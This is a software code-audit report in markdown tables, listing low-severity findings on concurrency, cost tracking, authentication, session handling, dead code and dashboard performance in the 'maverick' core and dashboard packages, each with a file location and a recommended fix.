### core/job_queue (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-62 | low | Raised (finder cited evidence; skeptic pass not run) | concurrency | `packages/maverick-core/maverick/job_queue.py:120` | JobQueue opens a fresh connection per operation and sets journal_mode=WAL before busy_timeout, the ordering the world model explicitly avoids | Set busy_timeout before journal_mode (or only switch to WAL once in _ensure_schema), and keep a per-thread/long-lived connection instead of reconnecting per call, mirroring WorldModel. | S |
| W1-63 | low | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `packages/maverick-core/maverick/job_queue.py:401` | JobQueue reclaim path is still at-least-once while docs and the soak gate say exactly-once (unresolved ADVERSARY_COUNCIL #13) | Reword FEATURES.md / soak docs to 'exactly-once claim, at-least-once execution after lease expiry', and add a soak scenario that freezes a worker past the lease so the duplicate is measured rather than assumed. | S |

### core/job_queue + worker (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-78 | low | Raised (finder cited evidence; skeptic pass not run); prior | concurrency | `packages/maverick-core/maverick/job_queue.py:241` | JobQueue.claim() returns None on a lost SELECT/UPDATE race, so a worker thread sleeps idle_sleep while ready jobs remain | Loop the SELECT/UPDATE inside claim() (retry up to N times on rowcount==0) or wrap the pair in BEGIN IMMEDIATE so the winner is decided before the SELECT; alternatively have run_forever treat a lost race as 'try again immediately'. | S |

### core/llm hedging (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-14 | low | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/llm.py:1623` | Tail-latency hedge: the losing backup request is cancelled without recording its spend | Account the hedge conservatively: on cancellation of the loser, record the reserved estimate (_est_cost) as spent (or at least the input-side estimate), or run the backup non-cancellably to completion and record its real usage. Surface hedge count/cost as a metric. | S |

### core/llm provider cap ledger (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-16 | low | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/llm.py:1179` | Budget-less LLM calls (view_image, docs_i18n, provision) are invisible to the deployment-wide provider spend cap and provider_health dollars | Compute _response_call_cost regardless of budget (fall back to the budget diff only when a budget exists and usage is absent), and make the three call sites pass the goal's Budget (view_image runs inside an agent turn with ctx.budget available). | S |

### core/llm streaming (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-12 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/llm.py:1395` | Token-delta streaming (on_delta) is Anthropic-only and silently dropped for every other provider; the parameter has no live caller | Either implement delta streaming uniformly (OpenAI `stream=True` with `stream_options={'include_usage': True}` so usage still lands in Budget; Anthropic AsyncAnthropic.messages.stream on complete_async) and wire it into the CLI chat/dashboard, or drop the parameter from the protocol and document that streaming is not supported. At minimum log a warning when on_delta is given for a provider that ignores it. | M |

### core/llm telemetry (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-15 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/llm.py:1644` | asyncio cancellation of an LLM call is recorded as a successful $0 call (breaker reset, provider_health success) | Track outcome tri-state: catch BaseException to set a 'cancelled' flag, skip breaker/health recording (or record as neither success nor failure) on cancellation, and re-raise. | S |

### core/mcp_oauth (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-81 | low | Raised (finder cited evidence; skeptic pass not run); prior | concurrency | `packages/maverick-core/maverick/mcp_oauth.py:122` | OAuth client-credentials token fetch performs the blocking HTTP call while holding the provider lock (unfixed prior finding) | Decide under the lock, release it, perform the network call, re-acquire to store (with a single-flight guard so only one refresh runs). | S |

### core/notification_batcher (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-80 | low | Raised (finder cited evidence; skeptic pass not run); prior | reliability | `packages/maverick-core/maverick/notification_batcher.py:185` | Notification batcher flusher thread cannot be stopped and is orphaned on reset_shared() (unfixed prior finding) | Give the batcher a threading.Event stop flag, wait on it instead of time.sleep, and have reset_shared()/a stop() hook signal+join the previous flusher. | S |

### core/oauth_vault + secret_provider (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-65 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/oauth_vault.py:117` | OAuth vault save has no fsync before os.replace, and secret_provider file backend reads secret files without mode/symlink checks | Use file_lock.atomic_write_bytes(path, blob, mode=0o600) in OAuthVault._save; call file_lock.ensure_private_file before reading secret files (or at least warn on group/world-readable modes). | S |

### core/oidc + dashboard/invites (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-23 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/oidc.py:252` | Session-signing secrets have no minimum-strength check although the docs require '32+ random bytes' | Refuse to enable OIDC/SAML/invite login (fail closed at startup with an actionable message) when the session secret is shorter than 32 characters; have the wizard generate secrets.token_urlsafe(48) by default instead of prompting for free text. | S |

### core/privacy (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-82 | low | Raised (finder cited evidence; skeptic pass not run) | compliance | `packages/maverick-core/maverick/privacy.py:63` | Anonymization HMAC salt is deployment-wide, so pseudonyms are linkable across tenants | Derive the effective salt as HMAC(deployment_salt, current_tenant_id() or 'shared') so pseudonyms are tenant-unique while the legacy single-tenant mapping is preserved when no tenant is active. | S |

### core/privacy + core/reporting (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-65 | low | Raised (finder cited evidence; skeptic pass not run) | dead-code | `packages/maverick-core/maverick/rectification.py:1` | Two shipped modules (rectification.py, energy_accounting.py) have zero importers, zero tests and 0% coverage; docs admit they are 'built, not yet wired' | Either wire them (CLI/dashboard entry points + tests) or delete them and the FEATURES.md entries; add a CI check that every module under maverick/ has at least one importer or an explicit allowlist. | S |

### core/privacy_data_discovery_adapters (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-56 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/maverick/privacy_data_discovery_adapters.py:1064` | Data-discovery network adapters are the least-tested code in the suite (67% line coverage) | Add table-driven transport-fake tests per adapter covering: truncated/invalid pagination tokens, Content-Length drift, non-text media types, 3xx rejection, 401/403 vs 429/5xx retry classification, and the max_pages exhaustion path; target >=85% for the adapters and the policy compiler. | M |

### core/privacy_discovery_data_use_bridge (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-52 | low | Raised (finder cited evidence; skeptic pass not run) | dead-code | `packages/maverick-core/maverick/privacy_discovery_data_use_bridge.py:154` | privacy_discovery_data_use_bridge.py (2,184 lines) has no production importer, composition, wizard or config-lint wiring | Either add the dashboard composition + scheduler + config_lint rule + wizard step so the bridge is reachable, or move the module out of the shipped feature list (and reachability PRODUCTION claims) into an explicit experimental section until it is composed. | M |

### core/privacy_rights_source_worker (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-55 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/privacy_rights_source_worker.py:793` | Source worker silently abandons a leased callback when get_callback() raises | Count these as `skipped_unreadable` in the batch result, log the callback_id and exception type, and release the lease (store.fail_callback with a retryable error code) so the next cycle picks it up deliberately rather than by timeout. | S |

### core/reachability ledger (GRC scope) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-74 | low | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/reachability.lock.json:2` | reachability.lock.json is ~295 modules stale; 14 of the 42 GRC modules are not in the ledger and new TEST_ONLY modules never trip the gate | Regenerate the lock, make drift() report new TEST_ONLY/CLI_ONLY modules (not only UNREACHED), and either implement the FEATURES.md cross-check the docstring promises or drop that sentence. | S |

### core/regulatory_compiler (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-68 | low | Raised (finder cited evidence; skeptic pass not run) | compliance | `packages/maverick-core/maverick/regulatory_compiler.py:115` | GDPR 'Art. 32' obligation in the regulatory compiler describes a lawful-basis/recipient check that Art. 32 does not contain | Re-cite the obligation (e.g. 'Art. 6 / Art. 44' for lawful basis + transfer, keeping Art. 32 only if the rule text is rewritten to describe a security measure), update the id and the GDPR profile 'asserts' text, and note that changing an obligation id changes audit-evidence tags (add a deprecation alias if rows already exist). | S |

### core/retry (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-13 | low | Raised (finder cited evidence; skeptic pass not run); prior | reliability | `packages/maverick-core/maverick/retry/__init__.py:108` | Retry-After from the provider is clamped to MAX_DELAY (30s), guaranteeing a wasted re-429 when the server asks for longer; retry docstring still stale | Honour Retry-After up to a separate, larger ceiling (e.g. MAVERICK_LLM_RETRY_AFTER_MAX default 120s) and, when it exceeds the ceiling, give up immediately so the failover chain can move on instead of sleeping and re-failing; parse HTTP-date via email.utils.parsedate_to_datetime; fix the docstring. | S |

### core/retry + failover (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-19 | low | Raised (finder cited evidence; skeptic pass not run); prior | duplication | `packages/maverick-core/maverick/failover_policy.py:51` | Two divergent error classifiers (retry.classifier vs failover_policy.classify_error), both substring-matching English text | Collapse to one classifier driven primarily by isinstance checks against the resolved anthropic/openai/httpx2 exception classes and status_code, with the message regexes as a last resort; have failover_policy import it and map ErrorClass -> failover class. | S |

### core/sandbox/local (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-83 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/sandbox/local.py:327` | LocalBackend kills the process group by pid after the child has already been reaped — narrow PID-reuse race can SIGKILL an unrelated session leader | Capture the pgid before communicate() is even needed (os.getpgid(proc.pid) right after Popen, guarded by ESRCH) is not enough alone; instead track descendants via a pidfd/cgroup or only killpg when the group still contains a process whose start time predates the exec (read /proc/<pid>/stat starttime), or run the shell under a dedicated helper that owns the group (e.g. `setsid` + kill by session id from /proc). At minimum skip killpg when proc.returncode is set and no child fds remain open. | M |

### core/schema_migrations (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-60 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/schema_migrations.py:131` | schema_migrations lint gate covers only the SQLite ladder; the Postgres ladder (DO $$ blocks, CREATE FUNCTION, DROP CONSTRAINT) is never classified | Have validate() and main() iterate both ladders (reuse migration_governance.ladders()), teach classify() the PG idioms (CREATE OR REPLACE FUNCTION, DO $$, ADD COLUMN IF NOT EXISTS, CREATE INDEX CONCURRENTLY), and print a per-backend verdict. | S |

### core/secrets + safety/secret_detector (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-60 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/secrets.py:94` | Both secret scrubbers only match UPPERCASE variable names, so lowercase/YAML-style `api_key = ...` / `password: ...` values are written to logs and the audit log unredacted | Add a case-insensitive rule for `(api[_-]?key\|secret\|password\|passwd\|token\|client_secret\|private_key)\s*[:=]\s*("..."\|'...'\|\S+)` limited to values >= 8 chars, in both modules (they are documented as mirrors) and the Rust parity fixture. | S |

### core/security_ops (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-72 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/security_ops.py:2817` | security_ops.add_evidence_request silently discards the 5001st request while returning success | Raise ValueError('at most 5000 evidence requests per engagement') before appending (mirroring dsar_fulfillment.record_collection_source's _MAX_SOURCES guard) instead of slicing after. | S |

### core/shield_ensemble (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-41 | low | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `packages/maverick-core/maverick/shield_ensemble.py:174` | ShieldEnsemble advertises an injection+jailbreak+exfil+policy lineup but ships no policy/jailbreak member | Either add a PolicyMember that runs the operator constitution (constitutional.scan) so the ensemble matches its docstring, or reword the docstring to the three members actually shipped (injection [incl. jailbreak], exfil, pii). ShieldEnsemble also appears unused by the runtime scan path — confirm it is wired somewhere or mark it as framework-only. | S |

### core/tenant/registry (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-79 | low | Raised (finder cited evidence; skeptic pass not run) | compliance | `packages/maverick-core/maverick/tenant/registry.py:633` | delete_tenant(purge=True) reports success after a partial purge and never purges the tenant's Postgres rows | Use onerror to collect failures and return/raise a report; when is_postgres_configured(), run a tenant-scoped DELETE across _TENANT_TABLES inside tenant_scope(tenant=tid) (using _mutation_tenant_scope) and record an erasure receipt. | M |
| W2-85 | low | Raised (finder cited evidence; skeptic pass not run); prior | maintainability | `packages/maverick-core/maverick/tenant/registry.py:692` | tenant_spend_today still reaches into UsageLedger._load() private API (unresolved prior finding) | Add UsageLedger.total_dollars(day) (public) and use it from tenant_spend_today; keep the inf fail-closed behaviour. | S |

### core/third_party_contracts (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-95 | low | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/third_party_contracts.py:593` | Contract 'decimal' custom fields and formula results are binary floats rounded with round() | Represent decimals as integer minor units or `decimal.Decimal` strings (quantize with ROUND_HALF_UP) in `_field_value`/`_computed_values`, and canonicalize them as strings in the JSON payload. | M |
| W4-96 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/third_party_contracts.py:2084` | Recovery backup leaks the destination SQLite connection and hides cleanup failures | Use `contextlib.closing(sqlite3.connect(target))` (and close the source connection) before hashing/chmod, and surface unlink failures in the raised error message. | S |

### core/third_party_lifecycle (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-93 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/third_party_lifecycle.py:406` | Lifecycle template conditions/risk rules are not type-checked against the question's response type, so mis-typed rules silently never fire | Validate operator/response_type compatibility and the expected value's type at template creation (e.g. numeric operators only for integer; contains only for multi_choice with option values; in only with a list of options). | S |
| W4-97 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/third_party_lifecycle.py:2640` | Callback dead-lettering during claim writes no audit event, unlike every other terminal transition | Emit a `callback_dead_lettered` audit event (callback_id, attempt, plan_id) in the same transaction. | S |

### core/tool_token (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-57 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/tool_token.py:162` | Per-call tool tokens load the private audit key from disk (under a cross-process lock) on every mint AND every verify, and verify ignores the token's key_id | Cache the (priv,pub,key_id) selection per process (invalidate on rotate); verify via trusted_audit_public_keys()[token.key_id] and never load private material on the verify path. | S |

### core/tools/_rest_connector (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-107 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tools/_rest_connector.py:275` | REST/GraphQL connector factory and web_archive buffer unbounded response bodies (no byte ceiling) unlike http_fetch/openapi_runner | Add a shared _ssrf.read_capped(response, max_bytes) helper (stream + iter_bytes) and use it in _rest_execute, make_graphql_tool, web_archive and entitlements with a 1-5 MB default and env override, mirroring openapi_runner._stream_text. | S |

### core/tools/email (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-106 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tools/email_tool.py:131` | IMAP reads in email_tool open IMAP4_SSL without a timeout; a stalled mail server hangs the agent turn indefinitely | Pass timeout=30 to both imaplib.IMAP4_SSL(...) constructors (supported since Python 3.9) and cover with a test that patches imaplib.IMAP4_SSL and asserts the kwarg. | S |

### core/tools/jwt_inspect (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-63 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/jwt_inspect.py:68` | jwt_inspect tool crashes with an unhandled ValueError on a non-ASCII signature segment | Catch (binascii.Error, ValueError) at line 68 (and in _b64url_decode generally). | S |

### core/worker + job_queue (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-77 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/worker.py:290` | Worker._successor_armed scans up to 100k pending rows (JSON-decoding each) on every cron job dispatch; JobQueue opens a fresh connection per operation | Persist the schedule key as an indexed column (or a `schedule_key` field queried with WHERE) so _successor_armed is a single indexed EXISTS; keep a per-JobQueue thread-local connection instead of connect-per-op. | S |

### core/workspace (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-81 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/workspace.py:54` | Workspace.current() ignores the client binding that data_dir() honors, so .tenant is None while .root is tenant-scoped | Build Workspace.current() from paths.current_tenant_id() (or current_tenant_id_strict()) instead of re-implementing resolution. | S |

### core/world_model tests (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-69 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_world_model_concurrency.py:62` | World-model concurrency tests pass vacuously: fixed 0.4 s window with no assertion that any writer or reader made progress | Count iterations in each thread and assert a minimum (e.g. `assert writes >= 50 and reads >= 50`), assert `not t.is_alive()` after join, and prefer a fixed number of operations over a fixed time window. | S |

### dashboard/_event_stream (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-38 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-dashboard/maverick_dashboard/_event_stream.py:12` | replay_cursor clamps an oversized since/Last-Event-ID to 2**63-1 and echoes it as next_id, wedging clients that persist the cursor | Treat a cursor greater than the goal's current max event id as invalid: clamp to the latest known event id (`SELECT MAX(id) FROM goal_events WHERE goal_id=?`) or return 400 for values beyond SQLite's range; add a test. | S |

### dashboard/_shared (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-76 | low | Raised (finder cited evidence; skeptic pass not run) | concurrency | `packages/maverick-dashboard/maverick_dashboard/_shared.py:145` | Dashboard world cache is an unlocked dict: concurrent first requests open duplicate WorldModel instances and leak the loser's connections | Guard the check-then-open in _world() with a module lock (double-checked), and close any instance that lost the race. | S |

### dashboard/admin_pages + app (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-32 | low | Raised (finder cited evidence; skeptic pass not run) | duplication | `packages/maverick-dashboard/maverick_dashboard/admin_pages.py:62` | Model-picker catalog logic is duplicated between app.model_picker_options and admin_pages.settings_page | Have admin_pages.settings_page call `_app().model_picker_options()` (plus the raw allow set for the checkbox section) and delete the inline copy. | S |

### dashboard/api executive boards (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-31 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-dashboard/maverick_dashboard/api.py:663` | Spend board 'outcomes' and 'per_run' series are computed from the 200 most recent episodes regardless of the selected window, while totals are exact | Either page through episodes within [since, now) (list_episodes supports offset) with a documented cap and a `sampled: true` flag, or store a plaintext outcome class column so the mix can be aggregated in SQL like the totals. | S |

### dashboard/api features/switches (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-41 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-dashboard/maverick_dashboard/api.py:10753` | Feature-switch mismatch path issues a second compensating overlay write and blames a 'higher-precedence source' for any read-after-write divergence | Distinguish causes: check `overlay[section]['enable']` after the write and report 'dashboard overlay did not persist' vs 'pinned by MAVERICK_* env' vs 'entitlement' (fleet_memory.enabled applies entitlement policy) with the actual owner; avoid writing on the error path. | S |

### dashboard/api glance + app replay (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-33 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-dashboard/maverick_dashboard/api.py:13164` | watch_glance and replay_page bypass the shared _world() cache and open a fresh WorldModel per request | Use `_world()` in both handlers (drop the close_world_if_owned teardown), keeping tenant floor semantics identical. | S |

### dashboard/api oversight (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-35 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-dashboard/maverick_dashboard/api.py:12702` | oversight/active issues one event query per active goal on every client poll (N+1, up to 50 queries per tick) | Fetch the latest event per goal in one statement (window function or `WHERE id IN (SELECT MAX(id) FROM goal_events WHERE goal_id IN (...) GROUP BY goal_id)`) and run it in run_in_threadpool. | S |

### dashboard/api partner console (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-39 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-dashboard/maverick_dashboard/api.py:3897` | /api/v1/partner/fleet?check=1 probes every registered tenant sequentially inside the request (3 HTTP calls x 4 s timeout each) | Run probes concurrently with a bounded gather (asyncio.gather over run_in_threadpool with a semaphore of ~8), cap per-call wall time, or move refresh to a background job and let the endpoint return cached results. | S |

### dashboard/api tools (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-29 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-dashboard/maverick_dashboard/api.py:9519` | GET /api/v1/tools rebuilds a sandbox and the full 294-tool registry on every call with no permission gate and no cache (700 KB, ~0.6 s) | Serve list_tools from _live_tool_index() (add the risk map there), run it in run_in_threadpool, add `require_permission(request, 'view')` for symmetry with sibling routes, and paginate like the /tools page (QA-057). | S |

### dashboard/app + core/worker (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-79 | low | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `packages/maverick-dashboard/maverick_dashboard/app.py:437` | Code comments still advertise the automation queue as 'exactly-once' although both the reclaim path and the complete()-failure path are at-least-once | Reword to 'claim-atomic, at-least-once for side effects; handlers must be idempotent' and link the caveat; keep 'exactly-once' only for the DB-level claim metric. | S |

### dashboard/app auth (bearer_auth) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-28 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/app.py:1712` | No-token loopback trust accepts the test-only Host 'testserver' in production | Accept 'testserver' only when `request.client.host == 'testclient'` (i.e. the in-process TestClient) or behind an explicit MAVERICK_DASHBOARD_TEST_HOSTS env used by the test fixture; never in the production path. | S |

### dashboard/app billing (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-42 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-dashboard/maverick_dashboard/app.py:4921` | /billing loads up to 10,000 episodes into Python per view and silently truncates statements beyond that | Aggregate cost/tokens/runs per month in SQL (GROUP BY strftime('%Y-%m', started_at, 'unixepoch')) with the owner subquery used by cost.csv, and stream the CSV for a single month the same way cost_csv does. | S |

### dashboard/app compartments page (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-30 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-dashboard/maverick_dashboard/app.py:5276` | /compartments renders all 2,031 packs into one 3.4 MB HTML page with no search or pagination | Add q/page/per_page Query params (mirroring tools_page) and render only the current slice; expose a JSON endpoint for the client-side finder instead of embedding all packs. | S |

### dashboard/app health compat (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-40 | low | Raised (finder cited evidence; skeptic pass not run) | dead-code | `packages/maverick-dashboard/maverick_dashboard/app.py:10392` | Compatibility re-exports _health_should_redact and _bounded_user_spend_series in app.py have no callers | Delete the two unreferenced wrappers (and migrate any future monkeypatching to maverick_dashboard.health_routes); keep _readiness_deep_checks only until test_app.py is updated. | S |

### dashboard/app middleware order (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-26 | low | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-dashboard/maverick_dashboard/app.py:1761` | http_metrics middleware is registered inside bearer_auth, so 401/403 auth rejections are never counted in lightwork_http_requests_total | Register http_metrics after bearer_auth/security_headers (outermost) or count inside bearer_auth's early-return branches; add a test asserting a 401 increments the route counter. | S |

### dashboard/app ux_store routes (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-34 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/app.py:7394` | POST /api/v1/goals/{id}/annotations has no role gate: a view-only principal can write shared trace annotations | Add `require_permission(request, 'operate')` to annotations_add (mirroring gallery_add), and add a test with a viewer principal. | S |

### dashboard/auth (OIDC login + SCIM revocation) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-27 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-dashboard/maverick_dashboard/oidc_login.py:389` | OIDC login requests only scope=openid, but SCIM deprovision bridging relies on email/preferred_username claims that many IdPs omit without the email/profile scopes | Request 'openid email profile' (configurable), and have scim._revoke_user_sessions log at warning level when a deprovisioned user has no directory binding so the gap is visible. | S |

### dashboard/auth (OIDC login) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-21 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/oidc_login.py:553` | GET /auth/logout clears the session without a same-origin check (logout CSRF) | Serve logout as a same-origin-gated POST (form button) or require _is_same_origin_get for the local cookie clear as well, returning a confirmation page for cross-site GETs. | S |

### dashboard/auth (exemptions) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-19 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/app.py:1290` | Full OpenAPI schema (1,717 paths) and Swagger/ReDoc UIs are served unauthenticated by default | Add a [dashboard] public_openapi = false knob (wizard step) that removes /openapi.json, /docs, /redoc from _AUTH_EXEMPT/_OIDC_EXEMPT_PATHS (Swagger UI can carry the bearer via its Authorize dialog), defaulting to private when any auth mechanism is configured. | S |

### dashboard/auth (sessions) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-22 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-dashboard/maverick_dashboard/saml.py:43` | Session lifetimes are inconsistent and mis-documented: SAML 8h 'matching' OIDC's 12h, revocation docstring says <=12h while invite sessions last 30 days | Centralize the browser-session TTL in one config knob ([dashboard] session_hours) used by OIDC, SAML and invites, add an idle timeout, and fix the docstrings. | S |

### dashboard/chat_goal (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-75 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-dashboard/maverick_dashboard/templates/chat_goal.html:886` | Artifact version history on the goal page gets stuck at 'Loading…' forever on any non-2xx or network error | Check r.ok before r.json(), add .catch that writes an error message and clears dataset.loaded so the next toggle retries. Consider a tiny shared helper in lightwork-ui.js (e.g. window.mvFetchJson returning {ok,status,data}) — assessments.html already has jfetch/responseData — and migrate the bare (await fetch()).json() call sites to it. | S |

### dashboard/css (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-80 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-dashboard/maverick_dashboard/static/lightwork.css:49` | lightwork.css defines the dark palette twice; the first block (and its failing 4.14:1 brand-fg pair) is dead and overridden 1,300 lines later | Delete the superseded values in the first block (keep color-scheme), or move the 1368-1373 override up and delete the duplicate, and add a one-line comment naming the single source of truth. Consider a tiny test computing contrast for the palette tokens so a future edit cannot drop below 4.5:1. | S |
